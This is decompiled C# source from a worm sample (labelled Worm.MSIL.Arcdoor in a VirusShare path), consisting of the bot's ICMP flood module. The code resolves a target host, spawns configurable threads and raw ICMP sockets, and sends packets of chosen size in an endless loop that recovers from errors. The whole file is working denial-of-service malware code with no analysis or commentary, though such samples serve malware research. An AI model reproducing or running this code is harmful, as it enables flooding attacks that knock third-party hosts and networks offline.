// Decompiled with JetBrains decompiler
// Type: SysDriver.nICMPFlood
// Assembly: SysDriver, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 591752E5-2C24-490A-AF88-A636AB72D7B7
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Worm.MSIL.Arcdoor.ae-9a70c0fa82dd869c7b769f53a0f2f245e58c379690ba2933aaf80f8e9c831958.exe

using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace SysDriver
{
  internal class nICMPFlood
  {
    private static ThreadStart[] tFloodingJob;
    private static Thread[] tFloodingThread;
    public static string sFHost;
    public static int iICMPSockets;
    private static IPEndPoint IPEo;
    public static int iPSize;
    private static nICMPFlood.ICMPRequest[] ICMPClass;
    public static int iThreads;

    public static void StartICMPFlood()
    {
      try
      {
        nICMPFlood.IPEo = new IPEndPoint(Dns.GetHostEntry(nICMPFlood.sFHost).AddressList[0], 0);
      }
      catch
      {
        nICMPFlood.IPEo = new IPEndPoint(IPAddress.Parse(nICMPFlood.sFHost), 0);
      }
      nICMPFlood.tFloodingThread = new Thread[nICMPFlood.iThreads];
      nICMPFlood.tFloodingJob = new ThreadStart[nICMPFlood.iThreads];
      nICMPFlood.ICMPClass = new nICMPFlood.ICMPRequest[nICMPFlood.iThreads];
      for (int index = 0; index < nICMPFlood.iThreads; ++index)
      {
        nICMPFlood.ICMPClass[index] = new nICMPFlood.ICMPRequest(nICMPFlood.IPEo, nICMPFlood.iICMPSockets, nICMPFlood.iPSize);
        nICMPFlood.tFloodingJob[index] = new ThreadStart(nICMPFlood.ICMPClass[index].Send);
        nICMPFlood.tFloodingThread[index] = new Thread(nICMPFlood.tFloodingJob[index]);
        nICMPFlood.tFloodingThread[index].Start();
      }
    }

    public static void StopICMPFlood()
    {
      for (int index = 0; index < nICMPFlood.iThreads; ++index)
      {
        try
        {
          nICMPFlood.tFloodingThread[index].Abort();
          nICMPFlood.tFloodingThread[index].Join();
        }
        catch
        {
        }
      }
    }

    private class ICMPRequest
    {
      private int iICMPSockets;
      private IPEndPoint IPEo;
      private int iPSize;
      private Socket[] pSocket;

      public ICMPRequest(IPEndPoint tIPEo, int tICMPSockets, int tPSize)
      {
        this.IPEo = tIPEo;
        this.iICMPSockets = tICMPSockets;
        this.iPSize = tPSize;
      }

      public void Send()
      {
        byte[] buffer = new byte[this.iPSize];
label_1:
        try
        {
          while (true)
          {
            this.pSocket = new Socket[this.iICMPSockets];
            for (int index = 0; index < this.iICMPSockets; ++index)
            {
              this.pSocket[index] = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Icmp);
              this.pSocket[index].Blocking = false;
              this.pSocket[index].SendTo(buffer, (EndPoint) this.IPEo);
            }
            Thread.Sleep(100);
            for (int index = 0; index < this.iICMPSockets; ++index)
            {
              if (this.pSocket[index].Connected)
                this.pSocket[index].Disconnect(false);
              this.pSocket[index].Close();
              this.pSocket[index] = (Socket) null;
            }
            this.pSocket = (Socket[]) null;
          }
        }
        catch
        {
          for (int index = 0; index < this.iICMPSockets; ++index)
          {
            try
            {
              if (this.pSocket[index].Connected)
                this.pSocket[index].Disconnect(false);
              this.pSocket[index].Close();
              this.pSocket[index] = (Socket) null;
            }
            catch
            {
            }
          }
          goto label_1;
        }
      }
    }
  }
}
